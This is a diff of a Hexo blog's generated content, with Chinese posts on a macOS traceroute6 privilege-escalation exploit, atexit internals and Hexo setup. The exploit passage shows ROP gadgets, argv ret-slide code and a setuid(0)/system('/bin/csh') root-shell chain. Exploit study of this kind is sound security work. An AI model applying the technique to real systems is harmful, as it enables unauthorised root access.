 <p>【1】设置 traceroute6 的错误参数<br>【1】处的参数执行完以后给 parent 足够的时间来将 目标进程中 DATA段中__cleanup 函数指针覆盖为 一段gadget 的地址（此时shellcode 的地址还不能确定）, 就是步骤<a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">4</a>中找到的 gadget 的地址。<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// 0x7fffa333ab47 &lt;+1908&gt;: addq   $0x1d98, %rsp        </div><div class="line">// 0x7fffa333ab4e &lt;+1915&gt;: popq   %rbx</div><div class="line">// 0x7fffa333ab4f &lt;+1916&gt;: popq   %r12</div><div class="line">// 0x7fffa333ab51 &lt;+1918&gt;: popq   %r13</div><div class="line">// 0x7fffa333ab53 &lt;+1920&gt;: popq   %r14</div><div class="line">// 0x7fffa333ab55 &lt;+1922&gt;: popq   %r15</div><div class="line">// 0x7fffa333ab57 &lt;+1924&gt;: popq   %rbp</div><div class="line">// 0x7fffa333ab58 &lt;+1925&gt;: retq</div></pre></td></tr></table></figure></p>
 <p>这里 作者预测了tracerouter6 的栈帧长度是 0x948，</p>
-<p>【2】处将 ret slide 拷贝到 argv s 参数列表。<br>在调试的过程中发现 x86-64位机器系统库加载的地址从0x00007fff000000000开始偏移小余4G，所以所有 gadget 指令地址都包含2个NULL字节，因为argvs 默认以 NULL 字符结尾所以第二个 NULL 会被认为没有参数了，这样就无法在栈上喷射大量的 ret指令。这里通过使用2个参数指针来指向一个 ret 地址的方法来解决这个问题。<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">target_argv<span class="string">[argn++]</span> = &amp;args<span class="string">[0]</span>;</div><div class="line">  for(int i = <span class="number">1</span>; i &lt; target_argv_rop_size; i++) &#123;</div><div class="line">    if (args<span class="string">[i-1]</span> == <span class="number">0</span>) &#123;</div><div class="line">      target_argv<span class="string">[argn++]</span> = &amp;args<span class="string">[i]</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
-<p>这段代码实现了将 shellcode 内存地址 传递给 argv 指针，同时为了防止出现连续2个 null 字节的情况，将2个连续的 null字节（第二个）保存到了2个 argv 指针中。<br>说明：这段实现要提前检查 ret 地址中 null 字节的个数，null 字节不能超过2个否则 ret地址会被截断。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">count_nulls</span><span class="params">(<span class="keyword">uint64_t</span> val)</span> </span>&#123;</div><div class="line">  <span class="keyword">int</span> nulls = <span class="number">0</span>;</div><div class="line">  <span class="keyword">uint8_t</span>* bytes = (<span class="keyword">uint8_t</span>*)&amp;val;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</div><div class="line">    <span class="keyword">if</span> (bytes[i] == <span class="number">0</span>) &#123;</div><div class="line">      nulls++;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> nulls;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>【0】这里是提权的 shellcode， 先将自生uid 设置成 root 用户，然后开启一个终端这个终端默认是 root 用户并且不能自动降低权限。<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">setuid(<span class="number">0</span>)<span class="comment">;  //将当前进程设置为 root</span></div><div class="line">    pop rdi   <span class="comment">; 参数 为0</span></div><div class="line">    ret       <span class="comment">; setuid</span></div><div class="line"></div><div class="line">system(“/bin/csh”)<span class="comment">;</span></div><div class="line">    pop rdi   <span class="comment">; 参数 为’/bin/csh’</span></div><div class="line">    ret       <span class="comment">; system</span></div></pre></td></tr></table></figure></p>
+<p>【2】处将 ret slide 拷贝到 argv s 参数列表。<br>在调试的过程中发现 x86-64位机器系统库加载的地址从0x00007fff000000000开始偏移小余4G，所以所有 gadget 指令地址都包含2个NULL字节，因为argvs 默认以 NULL 字符结尾所以第二个 NULL 会被认为没有参数了，这样就无法在栈上喷射大量的 ret指令。这里通过使用2个参数指针来指向一个 ret 地址的方法来解决这个问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">target_argv[argn++] = &amp;args[0];</div><div class="line">  for(int i = 1; i &lt; target_argv_rop_size; i++) &#123;</div><div class="line">    if (args[i-1] == 0) &#123;</div><div class="line">      target_argv[argn++] = &amp;args[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
+<p>这段代码实现了将 shellcode 内存地址 传递给 argv 指针，同时为了防止出现连续2个 null 字节的情况，将2个连续的 null字节（第二个）保存到了2个 argv 指针中。<br>说明：这段实现要提前检查 ret 地址中 null 字节的个数，null 字节不能超过2个否则 ret地址会被截断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int count_nulls(uint64_t val) &#123;</div><div class="line">  int nulls = 0;</div><div class="line">  uint8_t* bytes = (uint8_t*)&amp;val;</div><div class="line">  for (int i = 0; i &lt; 8; i++)&#123;</div><div class="line">    if (bytes[i] == 0) &#123;</div><div class="line">      nulls++;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return nulls;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>【0】这里是提权的 shellcode， 先将自生uid 设置成 root 用户，然后开启一个终端这个终端默认是 root 用户并且不能自动降低权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">setuid(0);  //将当前进程设置为 root</div><div class="line">    pop rdi   ; 参数 为0</div><div class="line">    ret       ; setuid</div><div class="line"></div><div class="line">system(“/bin/csh”);</div><div class="line">    pop rdi   ; 参数 为’/bin/csh’</div><div class="line">    ret       ; system</div></pre></td></tr></table></figure></p>
 <p>最后来张图看下内存布局<br><img src="/include/img/4625/gadget_shellcode.jpg" alt="gadget_shellcode"></p>
 <h4 id="漏洞补丁："><a href="#漏洞补丁：" class="headerlink" title="漏洞补丁："></a>漏洞补丁：</h4><p>OS X El Capitan v10.11.6 and Security Update 2016-004 </p>
 <h3 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h3><p>  本文还有一些内容没有介绍，其中一些我也不清楚有些只知道皮毛。列举几个问题和待完善的地方：</p>
@@ -291,7 +676,7 @@ fptr_offset : __cleanup 相对 fptr_page 的偏移
 <h3 id="atexit-和-on-exit-函数"><a href="#atexit-和-on-exit-函数" class="headerlink" title="atexit() 和 on_exit() 函数"></a>atexit() 和 on_exit() 函数</h3><p>atexit() 是C 标准定义的一个通用工具函数。atexit 可以注册无参函数，在程序正常接受后调用该函数。</p>
 <h4 id="Case-5"><a href="#Case-5" class="headerlink" title="Case"></a>Case</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *glob;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, glob);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    atexit(test);</div><div class="line">    glob = <span class="string">"Exiting. \n"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>通过调试 可以知道其调用流程，然后分析源码：<br>Linux:<br><code>_start -&gt; __libc_start_main -&gt; __GI_exit -&gt; __run_exit_handlers</code></p>
-<p>OSX :<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">thread #<span class="number">1</span>: tid = <span class="number">0x264c8</span>, <span class="number">0x0000000100000f10</span> at`test, queue = <span class="string">'com.apple.main-thread'</span>, stop reason = breakpoint <span class="number">1.1</span></div><div class="line"> * frame #<span class="number">0</span>: <span class="number">0x0000000100000f10</span> at`test</div><div class="line">   frame #<span class="number">1</span>: <span class="number">0x00007fffbcbaf17f</span> libsystem_c.dylib`__cxa_finalize_ranges + <span class="number">339</span></div><div class="line">   frame #<span class="number">2</span>: <span class="number">0x00007fffbcbaf4b2</span> libsystem_c.dylib`exit + <span class="number">55</span></div><div class="line">   frame #<span class="number">3</span>: <span class="number">0x00007fffbcb1a25c</span> libdyld.dylib`start + <span class="number">8</span></div></pre></td></tr></table></figure></p>
+<p>OSX :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">thread #1: tid = 0x264c8, 0x0000000100000f10 at`test, queue = &apos;com.apple.main-thread&apos;, stop reason = breakpoint 1.1</div><div class="line"> * frame #0: 0x0000000100000f10 at`test</div><div class="line">   frame #1: 0x00007fffbcbaf17f libsystem_c.dylib`__cxa_finalize_ranges + 339</div><div class="line">   frame #2: 0x00007fffbcbaf4b2 libsystem_c.dylib`exit + 55</div><div class="line">   frame #3: 0x00007fffbcb1a25c libdyld.dylib`start + 8</div></pre></td></tr></table></figure></p>
 <p>现在 还没有找到 文章中说的 __exit_funcs 函数， linux 中有，但是 mac 上没有。</p>
 <p><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.h.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/exit.h.html</a><br><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.c.html#__run_exit_handlers" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/exit.c.html#__run_exit_handlers</a><br><a href="https://code.woboq.org/userspace/glibc/stdlib/exit.h.html#exit_function_list" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/stdlib/exit.h.html#exit_function_list</a></p>
 <p>使用 gdb 调试：<br>p  initial   打印出 全局变量 initial 的内存结构 （ struct exit_function_list ）<br>注意：</p>
@@ -724,7 +1109,7 @@ fptr_offset : __cleanup 相对 fptr_page 的偏移
 </li>
 </ol>
 <h2 id="更多功能"><a href="#更多功能" class="headerlink" title="更多功能"></a>更多功能</h2><p>(更多内容)[<a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="external">http://ibruce.info/2013/11/22/hexo-your-blog/</a>]<br>(统计)[<a href="http://busuanzi.ibruce.info/" target="_blank" rel="external">http://busuanzi.ibruce.info/</a>]</p>
-<p>hexo config review<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">hexo</span>: 3<span class="selector-class">.2</span><span class="selector-class">.2</span></div><div class="line"><span class="selector-tag">hexo-cli</span>: 1<span class="selector-class">.0</span><span class="selector-class">.2</span></div><div class="line"><span class="selector-tag">os</span>: <span class="selector-tag">Linux</span> 4<span class="selector-class">.x</span><span class="selector-class">.x-xx-generic</span> <span class="selector-tag">linux</span> <span class="selector-tag">xxx</span></div><div class="line"><span class="selector-tag">http_parser</span>: 1<span class="selector-class">.0</span></div><div class="line"><span class="selector-tag">node</span>: 0<span class="selector-class">.10</span><span class="selector-class">.25</span></div><div class="line"><span class="selector-tag">v8</span>: 3<span class="selector-class">.xx</span><span class="selector-class">.5</span><span class="selector-class">.9</span></div><div class="line"><span class="selector-tag">ares</span>: 1<span class="selector-class">.10</span><span class="selector-class">.0</span></div><div class="line"><span class="selector-tag">uv</span>: 0<span class="selector-class">.10</span><span class="selector-class">.23</span></div><div class="line"><span class="selector-tag">zlib</span>: 1<span class="selector-class">.2</span><span class="selector-class">.8</span></div><div class="line"><span class="selector-tag">modules</span>: 11</div><div class="line"><span class="selector-tag">openssl</span>: <span class="selector-tag">x</span><span class="selector-class">.x</span><span class="selector-class">.xf</span></div></pre></td></tr></table></figure></p>
+<p>hexo config review<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">hexo: 3.2.2</div><div class="line">hexo-cli: 1.0.2</div><div class="line">os: Linux 4.x.x-xx-generic linux xxx</div><div class="line">http_parser: 1.0</div><div class="line">node: 0.10.25</div><div class="line">v8: 3.xx.5.9</div><div class="line">ares: 1.10.0</div><div class="line">uv: 0.10.23</div><div class="line">zlib: 1.2.8</div><div class="line">modules: 11</div><div class="line">openssl: x.x.xf</div></pre></td></tr></table></figure></p>
 <h2 id="夸主机同步-Blog"><a href="#夸主机同步-Blog" class="headerlink" title="夸主机同步 Blog"></a>夸主机同步 Blog</h2><h3 id="CI辅助自动部署"><a href="#CI辅助自动部署" class="headerlink" title="CI辅助自动部署"></a>CI辅助自动部署</h3><p>参考文章:<br><a href="http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/" target="_blank" rel="external">http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/</a><br><a href="https://formulahendry.github.io/2016/12/04/hexo-ci/" target="_blank" rel="external">https://formulahendry.github.io/2016/12/04/hexo-ci/</a></p>
 <p>我首先尝试了使用appveyor 做CI的办法，效果不尽如人意。主要的问题在：</p>
 <pre><code>1. nodejs, hexo的版本和我本地不同，导致命令 解析都不一样。解决办法：可以在yml中下载制定版本
@@ -759,7 +1144,7 @@ fptr_offset : __cleanup 相对 fptr_page 的偏移
 <li>安装 node-v6.9.4</li>
 <li>clone 到本地以后，进入 repo目录然后安装工具&amp;模块。</li>
 <li><p>执行下面的命令就可以配置好 hexo</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">npm <span class="keyword">install</span> hexo <span class="comment">--save</span></div><div class="line">npm <span class="keyword">install</span></div><div class="line">npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">--save</span></div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">npm install hexo --save</div><div class="line">npm install</div><div class="line">npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
 </li>
 <li><p>下面就是测试 server,generate,deploy命令了</p>
 </li>
@@ -782,7 +1167,7 @@ fptr_offset : __cleanup 相对 fptr_page 的偏移
 <p>我遇到的坑, 在使用 GhoSadillaX 主题时，因为其gitignore 不上传_config.yml, 导致在 mac 上测试一直显示 duoshao 没配置short_name, 最后还是把 theme下的_config.yml找回来才解决。</p>
 </blockquote>
 <h3 id="hexo-博文设置-密码验证"><a href="#hexo-博文设置-密码验证" class="headerlink" title="hexo 博文设置 密码验证"></a>hexo 博文设置 密码验证</h3><p>首先，我们要了解 hexo 支持 markdown和javascript 混合编程。那么要实现对 单独的blog 加密，就可以在md 文件中嵌入一段校验密码的 js代码，如果要对所有的 blog 加密可以在 theme 中的 layout/_partial/header.ejs文件中添加一段校验密码的 js代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">    <span class="keyword">if</span>( prompt(<span class="string">"Please input password"</span>) !== <span class="built_in">String</span>(&#123;&#123; password &#125;&#125;) )</div><div class="line">    &#123;</div><div class="line">        alert(<span class="string">'密码错误！'</span>);</div><div class="line">        self.location=<span class="string">'http://localhost:4000/about/'</span>;</div><div class="line">        <span class="comment">// history.back();</span></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"密码正确"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
-<p>password 可以在 md文件头部设置<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">---</span></div><div class="line"><span class="attr">title:</span> xxx</div><div class="line"><span class="attr">date:</span> <span class="number">2017</span>-</div><div class="line"><span class="attr">tags:</span>  [xx,zz]</div><div class="line"><span class="attr">categories:</span></div><div class="line"><span class="attr">password:</span> password</div><div class="line"><span class="meta">---</span></div></pre></td></tr></table></figure></p>
+<p>password 可以在 md文件头部设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: xxx</div><div class="line">date: 2017-</div><div class="line">tags:  [xx,zz]</div><div class="line">categories:</div><div class="line">password: password</div><div class="line">---</div></pre></td></tr></table></figure></p>
 <h2 id="辅助脚本"><a href="#辅助脚本" class="headerlink" title="辅助脚本"></a>辅助脚本</h2><h3 id="本地测试脚本"><a href="#本地测试脚本" class="headerlink" title="本地测试脚本"></a>本地测试脚本</h3><p>rtest.sh<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Bhome=/home/floatg/data/FG-B<span class="built_in">log</span>/hexo/blog</div><div class="line">killall -9 hexo</div><div class="line"><span class="built_in">cd</span> <span class="variable">$Bhome</span></div><div class="line">hexo g</div><div class="line">hexo s</div></pre></td></tr></table></figure></p>
 <h3 id="gitignore-内容"><a href="#gitignore-内容" class="headerlink" title=".gitignore 内容"></a>.gitignore 内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.DS_Store</div><div class="line">*.log</div><div class="line">/.deploy*</div><div class="line">/_config.yml</div><div class="line">node_modules/</div><div class="line">public/</div><div class="line">rtest.sh</div><div class="line">db.json</div></pre></td></tr></table></figure>
 ]]></content>
